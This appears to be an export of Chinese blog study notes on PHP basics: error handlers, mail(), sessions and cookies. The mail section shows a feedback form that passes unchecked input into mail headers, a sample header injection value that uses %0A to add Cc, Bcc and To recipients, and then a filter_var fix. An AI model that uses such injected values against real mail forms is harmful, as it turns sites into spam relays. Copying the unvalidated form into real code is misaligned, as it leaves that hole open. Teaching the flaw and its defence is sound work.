<h2 id="设立错误处理程序"><a href="#设立错误处理程序" class="headerlink" title="设立错误处理程序"></a>设立错误处理程序</h2><p>对于所有错误来使用我们自定义的错误处理程序<br><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">set_error_handler(<span class="string">"customError"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>set_error_handler()仅需要一个参数，可以添加第二个参数来规定错误级别</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 错误处理函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 设置错误处理函数</span></span></span><br><span class="line"><span class="php">set_error_handler(<span class="string">"customError"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 触发错误</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($test);</span></span><br></pre></td></tr></table></figure>
<h2 id="触发错误"><a href="#触发错误" class="headerlink" title="触发错误"></a>触发错误</h2><p>在脚本中用户输入数据的位置，当用户的输入无效时触发错误是很有用的，这个任务由trigger_error()函数完成</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$test=<span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($test&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    trigger_error(<span class="string">"变量值必须小于等于 1"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Notice</span>: 变量值必须小于等于 <span class="number">1</span></span><br><span class="line"><span class="keyword">in</span> /www/test/runoob.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><br>该例子是”test” 变量大于 “1”，就会发生错误</p>
<p>还可以添加的第二个参数，您能够规定所触发的错误类型</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 错误处理函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"脚本结束"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 设置错误处理函数</span></span></span><br><span class="line"><span class="php">set_error_handler(<span class="string">"customError"</span>,E_USER_WARNING);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 触发错误</span></span></span><br><span class="line"><span class="php">$test=<span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($test&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    trigger_error(<span class="string">"变量值必须小于等于 1"</span>,E_USER_WARNING);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>[512] 变量值必须小于等于 1</span><br><span class="line">脚本结束</span><br></pre></td></tr></table></figure></p>
<h2 id="错误记录"><a href="#错误记录" class="headerlink" title="错误记录"></a>错误记录</h2><p>默认的情况下，根据php.ini中的error_log配置，向服务器的记录系统或文件发送错误记录。通过error_log()函数，可以向指定的文件或远程目的地发送错误记录</p>
<h2 id="通过E-Mail发送错误消息"><a href="#通过E-Mail发送错误消息" class="headerlink" title="通过E-Mail发送错误消息"></a>通过E-Mail发送错误消息</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 错误处理函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"已通知网站管理员"</span>;</span></span><br><span class="line"><span class="php">    error_log(<span class="string">"Error: [$errno] $errstr"</span>,<span class="number">1</span>,</span></span><br><span class="line"><span class="php">    <span class="string">"someone@example.com"</span>,<span class="string">"From: webmaster@example.com"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 设置错误处理函数</span></span></span><br><span class="line"><span class="php">set_error_handler(<span class="string">"customError"</span>,E_USER_WARNING);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 触发错误</span></span></span><br><span class="line"><span class="php">$test=<span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($test&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    trigger_error(<span class="string">"变量值必须小于等于 1"</span>,E_USER_WARNING);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>[512] 变量值必须小于等于 1</span><br><span class="line">已通知网站管理员</span><br></pre></td></tr></table></figure><br>接收自以上代码地邮件如下所示<br><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>[512] 变量值必须小于等于 1</span><br></pre></td></tr></table></figure><br>这个方法不适合所有的错误。常规错误应当通过使用默认的 PHP 记录系统在服务器上进行记录</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.直接使用die()函数来在遇到错误时终结程序运行，往往有时候是不太好的</p>
<p>2.set_error_handler() 仅需要一个参数，可以添加第二个参数来规定错误级别</p>
<p>3.触发错误使用trigger_error()函数来进行触发</p>
<p>4.set_error_handler(error_handler,error_type)其中error_handler是必须的，并且要与错误处理函数名称保持一致，error_type是可选项，可以设置错误级别</p>
<p>5.通过使用 error_log() 函数，您可以向指定的文件或远程目的地发送错误记录</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/15-基础13</title>
    <url>/2020/07/15/PHP-2020-7-15-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><p>PHP允许直接从脚本发送电子邮件</p>
<h2 id="mail-函数"><a href="#mail-函数" class="headerlink" title="mail()函数"></a>mail()函数</h2><p>mail()函数用于从脚本中发送电子邮件</p>
<p>语法<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mail</span><span class="params">(to,subject,message,headers,parameters)</span></span></span><br></pre></td></tr></table></figure><br>参数 | 描述</p>
<ul>
<li>| -<br>to | 必需。规定email接收者<br>subject | 必需。规定email的主题。注释：该参数不能包含任何新行字符<br>message | 必需。定义要发送的信息。应使用LF(\n)来分隔隔行。每行限制在70个字符内<br>headers | 可选。规定附加的标题，比如From、Cc和Bcc。应当使用CRLF(\r\n)分隔附加的标题<br>parameters | 可选。对邮件发送程序规定额外的参数</li>
</ul>
<h2 id="简易E-Mail"><a href="#简易E-Mail" class="headerlink" title="简易E-Mail"></a>简易E-Mail</h2><p>通过PHP发送电子邮件的最简单的方法是发送文本email</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$to = <span class="string">"someone@example.com"</span>;         <span class="comment">// 邮件接收者</span></span></span><br><span class="line"><span class="php">$subject = <span class="string">"Test"</span>;                <span class="comment">// 邮件标题</span></span></span><br><span class="line"><span class="php">$message = <span class="string">"Hello! 这是邮件的内容。"</span>;  <span class="comment">// 邮件正文</span></span></span><br><span class="line"><span class="php">$from = <span class="string">"someonelse@example.com"</span>;   <span class="comment">// 邮件发送者</span></span></span><br><span class="line"><span class="php">$headers = <span class="string">"From:"</span> . $from;         <span class="comment">// 头部信息设置</span></span></span><br><span class="line"><span class="php">mail($to,$subject,$message,$headers);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"邮件已发送"</span>;</span></span><br></pre></td></tr></table></figure>
<h2 id="Mail表单"><a href="#Mail表单" class="headerlink" title="Mail表单"></a>Mail表单</h2><p>通过PHP，可以在站点下制作一个反馈表单。下面的实例向指定的e-mail地址发送一条文本消息<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'email'</span>])) &#123; <span class="comment">// 如果接收到邮箱参数则发送邮件</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 发送邮件</span></span></span><br><span class="line"><span class="php">    $email = $_REQUEST[<span class="string">'email'</span>] ;</span></span><br><span class="line"><span class="php">    $subject = $_REQUEST[<span class="string">'subject'</span>] ;</span></span><br><span class="line"><span class="php">    $message = $_REQUEST[<span class="string">'message'</span>] ;</span></span><br><span class="line"><span class="php">    mail(<span class="string">"someone@example.com"</span>, $subject,</span></span><br><span class="line"><span class="php">    $message, <span class="string">"From:"</span> . $email);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"邮件发送成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果没有邮箱参数则显示表单</span></span></span><br><span class="line">    echo "&lt;form method='post' action='mailform.php'&gt;</span><br><span class="line">    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Message:&lt;br&gt;</span><br><span class="line">    &lt;textarea name='message' rows='15' cols='40'&gt;</span><br><span class="line">    &lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type='submit'&gt;</span><br><span class="line"><span class="php">    &lt;/form&gt;<span class="string">";</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>首先，检查是否填写了邮件输入框</li>
<li>如果未填写，输出HTML表单</li>
<li>如果已填写，从表单发送电子邮件</li>
<li>当填写完表单点击提交按钮后，页面重新载入，可以看到邮件输入被重置，同时显示邮件发送成功的消息</li>
</ul>
<p>更多mail()函数信息可以参考手册<br><a href="https://www.runoob.com/php/php-ref-mail.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-mail.html</a></p>
<h2 id="E-mail注入"><a href="#E-mail注入" class="headerlink" title="E-mail注入"></a>E-mail注入</h2><p>就在上面的例子中，其实是存在安全问题</p>
<p>上面代码存在的问题是：未经授权的用户可以通过输入表单在邮件头部插入数据</p>
<p>例如插入<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">someone@</span>example.com%<span class="number">0</span>ACc:<span class="symbol">person2@</span>example.com</span><br><span class="line">%<span class="number">0</span>ABcc:<span class="symbol">person3@</span>example.com,<span class="symbol">person3@</span>example.com,</span><br><span class="line"><span class="symbol">anotherperson4@</span>example.com,<span class="symbol">person5@</span>example.com</span><br><span class="line">%<span class="number">0</span>ABTo:<span class="symbol">person6@</span>example.com</span><br></pre></td></tr></table></figure><br>由于是正常语法，mail()函数会把上面的文本放入邮件头部，现在头部就有了额外的Cc: Bcc: To:字段。当用户点击提交时便会发送到上面所有的地址</p>
<h2 id="防止E-mail注入"><a href="#防止E-mail注入" class="headerlink" title="防止E-mail注入"></a>防止E-mail注入</h2><p>防止最好的方法就是对输入的内容进行验证</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">spamcheck</span><span class="params">($field)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// filter_var() 过滤 e-mail</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 FILTER_SANITIZE_EMAIL</span></span></span><br><span class="line"><span class="php">    $field=filter_var($field, FILTER_SANITIZE_EMAIL);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">//filter_var() 过滤 e-mail</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 FILTER_VALIDATE_EMAIL</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(filter_var($field, FILTER_VALIDATE_EMAIL))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'email'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 如果接收到邮箱参数则发送邮件</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 判断邮箱是否合法</span></span></span><br><span class="line"><span class="php">    $mailcheck = spamcheck($_REQUEST[<span class="string">'email'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($mailcheck==<span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"非法输入"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;    </span></span><br><span class="line"><span class="php">        <span class="comment">// 发送邮件</span></span></span><br><span class="line"><span class="php">        $email = $_REQUEST[<span class="string">'email'</span>] ;</span></span><br><span class="line"><span class="php">        $subject = $_REQUEST[<span class="string">'subject'</span>] ;</span></span><br><span class="line"><span class="php">        $message = $_REQUEST[<span class="string">'message'</span>] ;</span></span><br><span class="line"><span class="php">        mail(<span class="string">"someone@example.com"</span>, <span class="string">"Subject: $subject"</span>,</span></span><br><span class="line"><span class="php">        $message, <span class="string">"From: $email"</span> );</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Thank you for using our mail form"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// 如果没有邮箱参数则显示表单</span></span></span><br><span class="line">    echo "&lt;form method='post' action='mailform.php'&gt;</span><br><span class="line">    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Message:&lt;br&gt;</span><br><span class="line">    &lt;textarea name='message' rows='15' cols='40'&gt;</span><br><span class="line">    &lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type='submit'&gt;</span><br><span class="line"><span class="php">    &lt;/form&gt;<span class="string">";</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面这个例子使用了过滤器来对输入进行验证</p>
<ul>
<li>FILTER_SANITIZE_EMAIL 过滤器从字符串中删除电子邮件的非法字符</li>
<li>FILTER_VALIDATE_EMAIL 过滤器验证电子邮件地址的值</li>
<li>filter_var()通过指定的过滤器过滤，语法为<code>filter_var(variable, filter, options)</code>;如果成功，则返回已过滤的数据，如果失败，则返回 false</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.电子邮件的发送使用mail()函数进行，可以事先定义好相关变量，必要的变量是to：接收者 subject：主题 message：发送的消息，发送者一般使用from变量 并添加在headers中</p>
<p>2.也可以使用表单来发送e-mail</p>
<p>3.编写e-mail表单时，要注意使用过滤器验证用户输入的合法性，不能过分相信用户输入，避免出现安全问题</p>
<p>4.常见的e-mail过滤器为<code>FILTER_SANITIZE_EMAIL</code> 过滤器从字符串中删除电子邮件的非法字符<br><code>FILTER_VALIDATE_EMAIL</code> 过滤器验证电子邮件地址的值<br>使用filter_var()函数来进行过滤</p>
<p>5.具体关于Filter的内容可以参考手册<a href="https://www.runoob.com/php/php-filter.html，后面会学到" target="_blank" rel="noopener">https://www.runoob.com/php/php-filter.html，后面会学到</a></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/14-基础12</title>
    <url>/2020/07/14/PHP-2020-7-14-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>PHP session变量用于存储关于用户会话(session)的信息，或者更改用户会话(session)的设置。Session变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的</p>
<h2 id="session变量"><a href="#session变量" class="headerlink" title="session变量"></a>session变量</h2><p>当在计算机上操作某个应用程序(打开，修改，关闭)。这就很想一次会话(session)。计算机知道你是谁，何时打开和关闭程序。但是当网络出现问题时，HTTP地址就无法保持状态，Web服务器就不知道你是谁和干了什么</p>
<p>session就是为了解决这个问题而存储在服务器上的用户信息，方便用户使用而产生的</p>
<p>session的工作机制是为每一个访客创建一个唯一的id,基于这个UID来存储变量，UID存储到cookie中，或通过URL传导</p>
<h2 id="启动session"><a href="#启动session" class="headerlink" title="启动session"></a>启动session</h2><p>在存储到session之前，必须启动会话</p>
<p>session_start()函数必须位于<code>&lt;html&gt;</code>标签之前</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>该代码会向服务器注册用户的会话，以便可以开始保存用户信息，同时会分配一个UID</p>
<h2 id="存储session变量"><a href="#存储session变量" class="headerlink" title="存储session变量"></a>存储session变量</h2><p>存储和取回session变量是使用$_SESSION变量<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="comment">// 存储 session 数据</span></span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'views'</span>]=<span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 检索 session 数据</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"浏览量："</span>. $_SESSION[<span class="string">'views'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">浏览量：<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h2 id="销毁session"><a href="#销毁session" class="headerlink" title="销毁session"></a>销毁session</h2><p>希望删除某些session变量，可以使用unset()或session_destroy()函数</p>
<p>unset()函数用于释放指定的session变量<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'views'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">unset</span>($_SESSION[<span class="string">'views'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>也可以通过调用session_destroy()函数彻底销毁session<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.使用session前，需要在<code>&lt;html&gt;</code>标签之前使用session_start()函数</p>
<p>2.使用session_start()函数之后，服务器便会注册用户的会话，并开始保存用户信息，同时会分配UID</p>
<p>3.存储session变量使用$_SESSION直接创建和赋值</p>
<p>4.unset()可以销毁指定的session变量，而调用session_destroy()便会失去所有已存储的session数据</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/13-基础11</title>
    <url>/2020/07/13/PHP-2020-7-13-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>常用于识别用户</p>
<h2 id="Cookie是什么"><a href="#Cookie是什么" class="headerlink" title="Cookie是什么"></a>Cookie是什么</h2><p>cookie常用于识别用户。cookie是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送cookie,通过PHP，可以创建并取回cookie的值</p>
<h2 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h2><p>setcookie()函数用于设置cookie</p>
<p>setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前</p>
<p>语法<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="type">name</span>, <span class="keyword">value</span>, expire, <span class="type">path</span>, <span class="keyword">domain</span>);</span><br></pre></td></tr></table></figure></p>
<p>实例1<br>创建名为user的cookie,并为它赋值runoob。我们也规定了此cookie再一小时后过期<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">setcookie(<span class="string">"user"</span>, <span class="string">"runoob"</span>, time()+<span class="number">3600</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在发送cookie时，cookie的值会自动进行URL编码，在取回时自动解码(为了防止URL编码，请使用setrawcookie()取而代之）</p>
<p>实例2<br>您还可以通过另一种方式设置cookie的过期时间<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$expire=time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span></span><br><span class="line"><span class="php">setcookie(<span class="string">"user"</span>, <span class="string">"runoob"</span>, $expire);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这个例子过期时间被设置为(60秒*60分*24小时*30天），也就是1个月</p>
<h2 id="取回Cookie值"><a href="#取回Cookie值" class="headerlink" title="取回Cookie值"></a>取回Cookie值</h2><p>PHP的$_COOKIE变量用于取回cookie的值</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 输出 cookie 值</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_COOKIE[<span class="string">"user"</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 查看所有 cookie</span></span></span><br><span class="line"><span class="php">print_r($_COOKIE);</span></span><br></pre></td></tr></table></figure>
<p>取回cookie名为user</p>
<p>还可以用isset()函数来确认是否已设置cookie<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"user"</span>]))</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"欢迎 "</span> . $_COOKIE[<span class="string">"user"</span>] . <span class="string">"!&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"普通访客!&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
